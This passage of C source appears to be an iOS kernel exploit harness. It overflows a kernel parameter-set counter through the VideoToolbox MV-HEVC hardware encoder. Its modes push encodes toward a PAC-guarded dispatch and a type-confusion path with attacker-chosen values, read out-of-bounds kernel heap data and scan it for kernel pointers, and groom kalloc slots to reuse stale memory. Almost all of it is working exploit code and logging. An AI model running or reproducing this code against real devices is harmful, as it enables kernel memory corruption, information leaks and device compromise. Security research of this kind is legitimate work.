                rlog("*** ENCODE 148 SURVIVED — entry 592 (+0x5C70) written without crash ***\n");
                rlog("*** Scenario B confirmed: SIMD/BLRAA/type_confusion all REACHABLE ***\n");
            } else if (i == 150) {
                rlog("*** ENCODE 151 SURVIVED — entries 604+ viable ***\n");
            }
        }
        VTCompressionSessionCompleteFrames(ct_s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(ct_s); CFRelease(ct_s);

    } else if (strcmp(mode, "blraa_boundary") == 0) {
        rlog("BLRAA_BOUNDARY: Encode to entry 639 (just before BLRAA trigger at 642)\n");
        rlog("Entry 642 (+0x5F94) byte 4 = layer_id controls BLRAA trigger.\n");
        rlog("Entry 640 is +0x5F74, entry 641 is +0x5F84, entry 642 is +0x5F94.\n");
        rlog("This probe encodes ~213 frames (639 entries) to measure behavior\n");
        rlog("at the BLRAA boundary WITHOUT triggering the forced call.\n\n");
        rlog("Strategy: If 213 encodes survive, the firmware data at +0x5F94\n");
        rlog("was originally zero (normal path, no BLRAA). If it panics earlier,\n");
        rlog("then the memcpy firmware data at +0x5F94 was already nonzero.\n\n");
        int bb_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("layer_id=0x%x, targeting 213 encodes (639 entries)\n\n", bb_lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(213, bb_lid);
        rlog("\nIf we survived 213 encodes: BLRAA trigger at +0x5F94 is likely zero.\n");
        rlog("Safe to attempt 214 encodes (entry 642) with controlled layer_id.\n");
        rlog("The BLRAA will fire using whatever function pointer is at the call site.\n");

    } else if (strcmp(mode, "type_confusion") == 0) {
        rlog("TYPE_CONFUSION: Target value==2 dispatch via +0x5F94 (entry 642)\n");
        rlog("Per BLRAA path analysis: layer_id at +0x5F94 controls 3-way dispatch:\n");
        rlog("  0 or >=3: skip (safe default)\n");
        rlog("  1: BLRAA vtable[0x188](self, 4) — real call\n");
        rlog("  2: 5-level chain walk → type confusion processing\n");
        rlog("Value==2 passes buffer+0x5F98 (OUR OOB DATA) as kernel-valid pointer\n");
        rlog("to vtable methods. NO PAN issue (pointer is in kernel heap).\n");
        rlog("Data interpreted as HEVC params but actually contains our controlled values.\n\n");
        rlog("REQUIRES: crash_test survival past 214 encodes (Scenario B)!\n");
        rlog("WARNING: If crash at 197, this WILL kernel panic!\n\n");
        if (phase1_verify() != 0) goto done;

        int tc_target_lid = 2;
        int tc_encodes = (argc > 2) ? atoi(argv[2]) : 215;
        rlog("Target: %d encodes, layer_id=%d on all entries\n", tc_encodes, tc_target_lid);
        rlog("Entry 642 (+0x5F94) layer_id byte gets value %d → triggers chain walk\n\n",
             tc_target_lid);

        VTCompressionSessionRef tc_s = create_mvhevc_encoder(128, 128, tc_target_lid);
        if (!tc_s) { rlog("FAILED: encoder creation\n"); goto done; }

        rlog("Phase A: Safe range (190 encodes)\n");
        for (int i = 0; i < 190; i++) {
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[%d] ok\n", i+1);
        }

        rlog("\nPhase B: Approach crash boundary (190-199)\n");
        for (int i = 190; i < 200; i++) {
            rlog("[%d] encoding (entries ~%d, offset +0x%x)... ",
                 i, i*3, 0x3770 + i*3*16);
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) {
                rlog("ERROR %d — crash boundary hit\n", st);
                rlog("*** Scenario A confirmed: entries 592+ UNREACHABLE ***\n");
                rlog("*** Type confusion path BLOCKED ***\n");
                goto tc_done;
            }
            rlog("OK\n");
        }
        rlog("*** Survived entry 592+ — Scenario B confirmed! ***\n\n");

        rlog("Phase C: Push to BLRAA trigger (200-%d)\n", tc_encodes);
        for (int i = 200; i < tc_encodes; i++) {
            rlog("[%d] encoding (entries ~%d)... ", i, i*3);
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) {
                rlog("ERROR %d\n", st);
                rlog("*** Encode %d failed — crash at entry ~%d ***\n", i, i*3);
                break;
            }
            rlog("OK\n");
            if (i == 213) {
                rlog("*** ENCODE 214 SURVIVED — entry 642 (+0x5F94) written ***\n");
                rlog("*** layer_id=2 placed at dispatch site ***\n");
                rlog("*** Next encode/finalize may trigger 5-level chain walk ***\n");
            }
        }

        rlog("\nPhase D: Finalize (triggers dispatch if entry 642 is processed)\n");
        VTCompressionSessionCompleteFrames(tc_s, kCMTimeInvalid);
        usleep(500000);
        rlog("CompleteFrames returned — session finalized\n");
        rlog("If we survived: dispatch path was either:\n");
        rlog("  a) Not reached during finalize (needs different trigger)\n");
        rlog("  b) Chain walk hit zero sub-branch → data processed silently\n");
        rlog("Check crash logs for any PAC/PAN faults.\n");

tc_done:
        VTCompressionSessionInvalidate(tc_s); CFRelease(tc_s);

    } else if (strcmp(mode, "safe_max") == 0) {
        rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
        rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
        rlog("This maximizes OOB corruption without triggering pointer crash\n\n");
        int sm_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("layer_id=0x%x, 196 encodes\n\n", sm_lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(196, sm_lid);

    } else if (strcmp(mode, "pset_dump") == 0) {
        rlog("PSET_DUMP: Stereo OOB read test (CVE-2026-112465)\n");
        rlog("Uses MV-HEVC stereo encoding to inflate VPS table counter,\n");
        rlog("then probes CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
        rlog("at indices beyond baseline to detect kernel heap data leak.\n");
        rlog("Kernel pointer pattern on A20 iOS 27.1: 0xfffffe00XXXXXXXX\n\n");
        int encodes = (argc > 2) ? atoi(argv[2]) : 100;
        int probe_max = (argc > 3) ? atoi(argv[3]) : 20;
        if (phase1_verify() != 0) goto done;

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
        if (!s) goto done;

        /* Record baseline pset count from first stereo encode */
        encode_one_stereo(s, 0, 1920, 1080);
        size_t baseline_count = g_last_pset_count;
        size_t baseline_bytes = g_last_pset_total_bytes;
        rlog("Baseline: pset_count=%zu, pset_bytes=%zu\n", baseline_count, baseline_bytes);

        rlog("Encoding %d stereo frames to inflate counter...\n", encodes);
        int errors = 0;
        for (int i = 1; i < encodes; i++) {
            int st = encode_one_stereo(s, i, 1920, 1080);
            if (st != 0) { errors++; if (errors < 5) rlog("[%d] Error: %d\n", i, st); }
            if ((i+1) % 25 == 0) {
                size_t est = (size_t)(i+1) * g_last_pset_count;
                rlog("[%d/%d] psets=%zu bytes=%zu est_entries=%zu%s\n",
                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes,
                     est, est >= 256 ? " OOB" : "");
            }
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);

        /* Final encode — the callback saves g_saved_fmt */
        rlog("\nFinal stereo encode to capture format description...\n");
        encode_one_stereo(s, encodes, 1920, 1080);
        rlog("Post-overflow: pset_count=%zu, pset_bytes=%zu (errors=%d)\n",
             g_last_pset_count, g_last_pset_total_bytes, errors);

        /* KEY TEST 1: Did pset_count increase? */
        if (g_last_pset_count > baseline_count) {
            rlog("\n*** COUNTER INFLATED: pset_count grew from %zu to %zu ***\n",
                 baseline_count, g_last_pset_count);
            rlog("This confirms the kernel VPS table counter accumulates!\n");
        } else {
            rlog("\npset_count unchanged at %zu (user-space API may normalize)\n",
                 g_last_pset_count);
        }

        /* KEY TEST 2: Did pset total bytes increase? */
        if (g_last_pset_total_bytes > baseline_bytes) {
            rlog("*** BYTES INFLATED: pset_bytes grew from %zu to %zu ***\n",
                 baseline_bytes, g_last_pset_total_bytes);
        }

        /* Dump all reported parameter sets */
        rlog("\n--- REPORTED PARAMETER SETS ---\n");
        dump_psets(g_saved_fmt, baseline_count);

        /* KEY TEST 3: Probe BEYOND reported count (OOB read) */
        rlog("\n--- OOB READ PROBE (indices %zu..%zu) ---\n",
             baseline_count, baseline_count + (size_t)probe_max - 1);
        rlog("If kernel counter is inflated, reads at index >= %zu\n", baseline_count);
        rlog("should succeed and return OOB kernel heap data.\n\n");
        int oob_found = 0;
        for (size_t i = baseline_count; i < baseline_count + (size_t)probe_max; i++) {
            const uint8_t *ptr = NULL;
            size_t sz = 0;
            int nal_hdr = 0;
            OSStatus pst = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                g_saved_fmt, i, &ptr, &sz, NULL, &nal_hdr);
            if (pst == 0 && ptr && sz > 0) {
                oob_found++;
                rlog("  [%zu] *** OOB READ OK *** nal=%d size=%zu\n", i, nal_hdr, sz);
                size_t dump_len = (sz > 128) ? 128 : sz;
                rlog("    ");
                for (size_t j = 0; j < dump_len; j++) {
                    rlog("%02x", ptr[j]);
                    if ((j+1) % 32 == 0) rlog("\n    ");
                    else if ((j+1) % 8 == 0) rlog(" ");
                }
                rlog("\n");
                if (sz >= 8) {
                    for (size_t j = 0; j <= sz - 8; j += 4) {
                        uint64_t qw = *(const uint64_t *)(ptr + j);
                        if ((qw >> 40) == 0xfffffe) {
                            rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
                                 j, (unsigned long long)qw);
                        }
                    }
                }
            } else if (pst == 0) {
                rlog("  [%zu] returned OK but ptr=%p sz=%zu (empty)\n", i, (void*)ptr, sz);
            } else {
                rlog("  [%zu] error=%d (expected if counter not inflated)\n", i, (int)pst);
                if (i == baseline_count) {
                    rlog("  First OOB probe failed — counter likely resets per-encode\n");
                    rlog("  or user-space API clamps to real count.\n");
                    break;
                }
            }
        }

        if (oob_found > 0) {
            rlog("\n*** SUCCESS: %d OOB reads returned data = KERNEL HEAP LEAK ***\n", oob_found);
            rlog("CVE-2026-112465 OOB read is CONFIRMED and EXPLOITABLE.\n");
        } else {
            rlog("\nNo OOB data via parameter set readback.\n");
            rlog("Possible: (a) kernel counter resets per encode for stereo,\n");
            rlog("(b) user-space API clamps index to real count,\n");
            rlog("(c) OOB read needs different readback path.\n");
        }

        VTCompressionSessionInvalidate(s); CFRelease(s);
        if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }

    } else if (strcmp(mode, "stereo_keyframe") == 0) {
        rlog("STEREO_KEYFRAME: Force-keyframe counter accumulation test\n");
        rlog("Every frame forced to IDR keyframe via kVTEncodeFrameOptionKey_ForceKeyFrame.\n");
        rlog("This ensures VPS/SPS/PPS NAL units are emitted on EVERY encode,\n");
        rlog("not just periodic GOP keyframes. If the kernel VPS table counter\n");
        rlog("accumulates, we should see a crash at ~64 encodes (entry 256).\n\n");
        int encodes = (argc > 2) ? atoi(argv[2]) : 70;
        if (phase1_verify() != 0) goto done;

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
        if (!s) goto done;

        size_t baseline_bytes = 0;
        int errors = 0;
        int bytes_changed = 0;
        for (int i = 0; i < encodes; i++) {
            int st = encode_one_stereo_kf(s, i, 1920, 1080, 1, 1);
            if (i == 0) {
                baseline_bytes = g_last_pset_total_bytes;
                rlog("Baseline: pset_count=%zu, bytes=%zu (all frames forced keyframe)\n",
                     g_last_pset_count, baseline_bytes);
            }
            if (st != 0) {
                errors++;
                rlog("[%d] ENCODE ERROR: %d\n", i, st);
                if (errors >= 5) { rlog("Too many errors, stopping\n"); break; }
            }
            if (g_last_pset_total_bytes != baseline_bytes && !bytes_changed) {
                bytes_changed = 1;
                rlog("[%d] *** PSET BYTES CHANGED: %zu -> %zu ***\n",
                     i, baseline_bytes, g_last_pset_total_bytes);
                rlog("This indicates intra-buffer corruption from counter overflow!\n");
            }
            if ((i+1) % 10 == 0 || i == encodes-1) {
                size_t est = (size_t)(i+1) * g_last_pset_count;
                rlog("[%d/%d] psets=%zu bytes=%zu est_entries=%zu%s err=%d\n",
                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes,
                     est, est >= 256 ? " ***OOB***" : "", errors);
            }
        }

        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(s); CFRelease(s);

        if (bytes_changed)
            rlog("\n*** PSET BYTES CHANGED during encoding — counter IS accumulating ***\n");
        else if (errors == 0 && encodes >= 64)
            rlog("\n%d keyframe encodes completed with no crash and stable pset bytes.\n"
                 "If est_entries > 256 but no crash, counter may reset per keyframe,\n"
                 "or VPS table entries only accumulate on NON-keyframe encodes.\n", encodes);
        else
            rlog("\nTest completed: %d encodes, %d errors, bytes_changed=%d\n",
                 encodes, errors, bytes_changed);

    } else if (strcmp(mode, "session_reuse") == 0) {
        rlog("SESSION_REUSE: Test kalloc_data memory reuse (stale counter attack)\n");
        rlog("Theory: if freed HEVC buffer memory isn't zeroed, a new session\n");
        rlog("inherits the old VPS counter value. If counter was 588 (196*3),\n");
        rlog("new entries start DIRECTLY in the crash zone on first encode.\n\n");
        rlog("This bypasses the 197-encode safe window entirely.\n\n");

        if (phase1_verify() != 0) goto done;

        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xDEAD;
        int sr_rounds = (argc > 3) ? atoi(argv[3]) : 5;
        rlog("Session A layer_id=0x%x, %d reuse rounds\n\n", sr_lid, sr_rounds);

        /* Session A: encode 196 times (safe max) to inflate counter to ~588 */
        rlog("--- Session A: 196 encodes (counter inflation) ---\n");
        VTCompressionSessionRef sa = create_mvhevc_encoder(128, 128, sr_lid);
        if (!sa) { rlog("FAILED: Session A encoder creation\n"); goto done; }

        for (int i = 0; i < 196; i++) {
            int st = encode_one(sa, i, 128, 128);
            if (st != 0) { rlog("[A:%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[A:%d] ok, ~%d entries\n", i+1, (i+1)*3);
        }
        VTCompressionSessionCompleteFrames(sa, kCMTimeInvalid);
        usleep(200000);

        /* Record Session A's final pset state */
        size_t sa_psets = g_last_pset_count;
        size_t sa_bytes = g_last_pset_total_bytes;
        rlog("Session A final: pset_count=%zu, pset_bytes=%zu\n", sa_psets, sa_bytes);

        /* Free Session A — HEVC buffer goes back to kalloc */
        rlog("\nFreeing Session A (HEVC buffer returns to kalloc_data)...\n");
        VTCompressionSessionInvalidate(sa); CFRelease(sa);
        usleep(100000);

        /* Session B: allocate new encoder — may reuse same memory */
        for (int round = 0; round < sr_rounds; round++) {
            rlog("\n--- Session B (round %d/%d): testing for stale counter ---\n",
                 round+1, sr_rounds);
            VTCompressionSessionRef sb = create_mvhevc_encoder(128, 128, sr_lid);
            if (!sb) { rlog("FAILED: Session B encoder creation\n"); continue; }

            /* Encode just 1 frame and observe pset behavior */
            rlog("  Encoding 1 frame...\n");
            g_last_pset_count = 0;
            g_last_pset_total_bytes = 0;
            int st = encode_one(sb, 0, 128, 128);
            rlog("  Result: status=%d, pset_count=%zu, pset_bytes=%zu\n",
                 st, g_last_pset_count, g_last_pset_total_bytes);

            /* Compare with expected fresh-session values:
             * Fresh: pset_count=3 (VPS+SPS+PPS), small byte count
             * Stale counter: pset_count >> 3 (counter starts high, reads OOB entries)
             * Or: session creation crash (stale data causes fault) */
            if (g_last_pset_count > 10) {
                rlog("  *** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
                     g_last_pset_count);
                rlog("  *** Session B counter started at stale value from Session A ***\n");
                rlog("  *** Memory NOT zeroed by kalloc_data! ***\n");
            } else if (g_last_pset_count <= 3 && st == 0) {
                rlog("  Normal: pset_count=%zu (fresh counter, memory likely zeroed)\n",
                     g_last_pset_count);
            }

            /* Encode 5 more frames to observe counter growth */
            rlog("  Encoding 5 more frames to observe counter...\n");
            for (int i = 1; i <= 5; i++) {
                st = encode_one(sb, i, 128, 128);
                rlog("    [B:%d] status=%d psets=%zu bytes=%zu\n",
                     i, st, g_last_pset_count, g_last_pset_total_bytes);
                if (st != 0) break;
            }
            VTCompressionSessionCompleteFrames(sb, kCMTimeInvalid);
            usleep(100000);

            /* Free session B for next round */
            VTCompressionSessionInvalidate(sb); CFRelease(sb);
            usleep(100000);
        }

        rlog("\nSession reuse test complete.\n");
        rlog("If stale counter detected: skip crash_test, exploit directly.\n");
        rlog("If memory zeroed: session reuse trick not viable.\n");

    } else if (strcmp(mode, "safe_corrupt") == 0) {
        rlog("SAFE_CORRUPT: Target +0x5C34 within safe window (196 encodes)\n");
        rlog("Entry 588 at byte 4 = layer_id field (secondary param array param[0])\n");
        rlog("This is the ONLY driver-referenced field reachable without crash.\n\n");

        if (phase1_verify() != 0) goto done;

        int sc_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xFFFF;
        int sc_enc = (argc > 3) ? atoi(argv[3]) : 196;
        if (sc_enc > 197) { rlog("CLAMPED to 197 (crash boundary)\n"); sc_enc = 197; }
        rlog("layer_id=0x%x, encodes=%d\n\n", sc_lid, sc_enc);

        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, sc_lid);
        if (!s) { rlog("FAILED: encoder creation\n"); goto done; }

        /* Encode to safe limit — entry 588 reached at ~196 encodes */
        for (int i = 0; i < sc_enc; i++) {
            int st = encode_one(s, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) == sc_enc || (i+1) % 50 == 0)
                rlog("[%d/%d] ok, ~%d entries, psets=%zu bytes=%zu\n",
                     i+1, sc_enc, (i+1)*3, g_last_pset_count, g_last_pset_total_bytes);
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(200000);

        rlog("\n--- Safe corruption applied ---\n");
        rlog("Entry 588 (+0x5C34) now contains layer_id=0x%x at byte 4\n", sc_lid);
        rlog("Secondary param array param[0] corrupted; params[1-6] intact.\n");
        rlog("If device is still alive: safe_corrupt is SURVIVABLE.\n");
        rlog("Next: encode 1 more frame to observe firmware behavior with corrupted param.\n\n");

        /* One more encode to trigger firmware param read with corrupted value */
        rlog("--- Extra encode (firmware reads corrupted +0x5C34) ---\n");
        int st = encode_one(s, sc_enc, 128, 128);
        rlog("Extra encode: status=%d\n", st);
        if (st == 0) {
            rlog("SURVIVED: firmware tolerates corrupted param[0]\n");
            rlog("Encode 2 more to confirm stability...\n");
            for (int i = 1; i <= 2; i++) {
                st = encode_one(s, sc_enc+i, 128, 128);
                rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
                if (st != 0) break;
            }
        } else {
            rlog("CRASH/ERROR: firmware param corruption triggers fault at +0x5C34\n");
        }

        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else if (strcmp(mode, "session_reuse_groom") == 0) {
        rlog("SESSION_REUSE_GROOM: Enhanced stale counter with heap grooming\n");
        rlog("Strategy: allocate N dummy sessions, free target, allocate reuse.\n");
        rlog("Goal: increase probability of LIFO slot reuse in kalloc.49152.\n\n");

        if (phase1_verify() != 0) goto done;

        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 2;
        int sr_dummies = (argc > 3) ? atoi(argv[3]) : 3;
        rlog("layer_id=0x%x, dummy_sessions=%d\n\n", sr_lid, sr_dummies);

        /* Step 1: Create dummy sessions to fill kalloc.49152 free list */
        rlog("--- Step 1: Create %d dummy sessions (fill free list) ---\n", sr_dummies);
        VTCompressionSessionRef dummies[8];
        int n_dummies = (sr_dummies > 8) ? 8 : sr_dummies;
        for (int i = 0; i < n_dummies; i++) {
            dummies[i] = create_mvhevc_encoder(128, 128, 1);
            if (!dummies[i]) { rlog("Dummy %d: FAILED\n", i); n_dummies = i; break; }
            rlog("Dummy %d: created\n", i);
        }

        /* Step 2: Create target session and inflate counter */
        rlog("\n--- Step 2: Target session (196 encodes to inflate counter) ---\n");
        VTCompressionSessionRef target = create_mvhevc_encoder(128, 128, sr_lid);
        if (!target) { rlog("FAILED: target encoder creation\n"); goto cleanup_dummies; }

        for (int i = 0; i < 196; i++) {
            int st = encode_one(target, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[%d/196] ok\n", i+1);
        }
        VTCompressionSessionCompleteFrames(target, kCMTimeInvalid);
        usleep(200000);
        rlog("Target counter inflated to ~588\n");

        /* Step 3: Free target — its kalloc.49152 slot goes to free list (LIFO) */
        rlog("\n--- Step 3: Free target (most recent free → LIFO head) ---\n");
        VTCompressionSessionInvalidate(target); CFRelease(target);
        usleep(50000);

        /* Step 4: Create reuse session — should get the just-freed slot */
        rlog("\n--- Step 4: Create reuse session (should get stale slot) ---\n");
        VTCompressionSessionRef reuse = create_mvhevc_encoder(128, 128, sr_lid);
        if (!reuse) { rlog("FAILED: reuse encoder creation\n"); goto cleanup_dummies; }

        /* Step 5: Encode 1 frame and check for stale counter */
        g_last_pset_count = 0;
        g_last_pset_total_bytes = 0;
        int st = encode_one(reuse, 0, 128, 128);
        rlog("Reuse encode 1: status=%d, pset_count=%zu, pset_bytes=%zu\n",
             st, g_last_pset_count, g_last_pset_total_bytes);

        if (g_last_pset_count > 10) {
            rlog("\n*** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
                 g_last_pset_count);
            rlog("*** HEAP GROOMING WORKED: kalloc_data reuse confirmed ***\n");
            rlog("*** Counter starts at ~588 → first encode hits crash zone ***\n");
            rlog("*** With lid=%d, +0x5F94 dispatch reachable in ~18 encodes ***\n", sr_lid);
        } else {
            rlog("Normal counter (memory zeroed or different slot). psets=%zu\n",
                 g_last_pset_count);
        }

        /* Encode a few more to observe */
        for (int i = 1; i <= 5; i++) {
            st = encode_one(reuse, i, 128, 128);
            rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
            if (st != 0) break;
        }

        VTCompressionSessionInvalidate(reuse); CFRelease(reuse);

cleanup_dummies:
        rlog("\n--- Cleanup: freeing dummy sessions ---\n");
        for (int i = 0; i < n_dummies; i++) {
            if (dummies[i]) {
                VTCompressionSessionInvalidate(dummies[i]);
                CFRelease(dummies[i]);
            }
        }

    } else if (strcmp(mode, "diag") == 0) {
        rlog("DIAG: Hardware encoder diagnostics\n\n");

        /* Test 1: Standard HEVC (no MV-HEVC) */
        rlog("--- Test 1: Standard HEVC hardware encode ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s1 = NULL;
            OSStatus r1 = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s1);
            CFRelease(es);
            rlog("Create: %d, session=%p\n", (int)r1, (void*)s1);
            if (r1 == 0 && s1) {
                VTSessionSetProperty(s1, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s1, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s1);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    int r = encode_one(s1, 0, 128, 128);
                    rlog("Encode result: %d, cb_count=%d, pset=%zu\n", r, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s1); CFRelease(s1);
            }
        }

        /* Test 2: MV-HEVC with layer_id=1 */
        rlog("\n--- Test 2: MV-HEVC hardware encode (layer_id=1) ---\n");
        {
            VTCompressionSessionRef s2 = create_mvhevc_encoder(128, 128, 1);
            rlog("Create MV-HEVC: session=%p\n", (void*)s2);
            if (s2) {
                g_cb_count = 0;
                int r = encode_one(s2, 0, 128, 128);
                rlog("Encode result: %d, cb_count=%d, pset=%zu\n", r, g_cb_count, g_last_pset_count);
                VTCompressionSessionInvalidate(s2); CFRelease(s2);
            }
        }

        /* Test 3: MV-HEVC with MVHEVCViewIDs (newer API) */
        rlog("\n--- Test 3: MV-HEVC with MVHEVCViewIDs property ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s3 = NULL;
            OSStatus r3 = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s3);
            CFRelease(es);
            rlog("Create: %d, session=%p\n", (int)r3, (void*)s3);
            if (r3 == 0 && s3) {
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                /* Try MVHEVCViewIDs instead of MVHEVCVideoLayerIDs */
                int v0 = 0, v1 = 1;
                CFNumberRef vids[2];
                vids[0] = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                vids[1] = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef varr = CFArrayCreate(NULL, (const void **)vids, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s3, CFSTR("MVHEVCViewIDs"), varr);
                rlog("MVHEVCViewIDs: %d\n", (int)sp1);
                CFRelease(varr); CFRelease(vids[0]); CFRelease(vids[1]);
                /* Also set left/right eye */
                CFNumberRef l = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef r = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                OSStatus sp2 = VTSessionSetProperty(s3, CFSTR("MVHEVCLeftAndRightViewIDs"), varr);
                rlog("MVHEVCLeftAndRightViewIDs: %d (may not exist)\n", (int)sp2);
                CFRelease(l); CFRelease(r);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s3);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    g_cb_count = 0;
                    int enc = encode_one(s3, 0, 128, 128);
                    rlog("Encode result: %d, cb_count=%d, pset=%zu\n",
                         enc, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s3); CFRelease(s3);
            }
        }

        /* Test 4: Check supported properties */
        rlog("\n--- Test 4: Property support check ---\n");
        {
            VTCompressionSessionRef s4 = create_mvhevc_encoder(128, 128, 1);
            if (s4) {
                CFDictionaryRef props = NULL;
                OSStatus ps = VTSessionCopySupportedPropertyDictionary(s4, &props);
                rlog("CopySupportedPropertyDictionary: %d\n", (int)ps);
                if (ps == 0 && props) {
                    CFIndex cnt = CFDictionaryGetCount(props);
                    rlog("Total supported properties: %ld\n", (long)cnt);
                    /* Check for MV-HEVC specific keys */
                    const char *mv_keys[] = {
                        "MVHEVCVideoLayerIDs", "MVHEVCLeftEyeID", "MVHEVCRightEyeID",
                        "MVHEVCViewIDs", "HasLeftStereoEyeView", "HasRightStereoEyeView",
                        "HeroEye", "StereoCameraBaseline", NULL
                    };
                    for (int i = 0; mv_keys[i]; i++) {
                        CFStringRef k = CFStringCreateWithCString(NULL, mv_keys[i], kCFStringEncodingUTF8);
                        Boolean has = CFDictionaryContainsKey(props, k);
                        rlog("  %s: %s\n", mv_keys[i], has ? "YES" : "no");
                        CFRelease(k);
                    }
                    CFRelease(props);
                }
                VTCompressionSessionInvalidate(s4); CFRelease(s4);
            }
        }

    } else if (strcmp(mode, "hevc_overflow") == 0) {
        rlog("HEVC_OVERFLOW: Standard HEVC encoder with 100 encodes\n");
        rlog("Tests if standard HEVC hits the same VPS table counter overflow\n\n");
        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            int errors = 0;
            for (int i = 0; i < 100 && pr == 0; i++) {
                int st = encode_one(s, i, 128, 128);
                if (st != 0) {
                    rlog("[%d] ERROR: %d\n", i, st);
                    errors++;
                    if (errors > 3) break;
                } else if (i % 10 == 0 || i >= 85) {
                    rlog("[%d] ok, pset=%zu, bytes=%zu, cb_count=%d\n",
                         i, g_last_pset_count, g_last_pset_total_bytes, g_cb_count);
                }
            }
            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            rlog("Done: %d encodes, %d errors, cb_count=%d\n", 100, errors, g_cb_count);
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

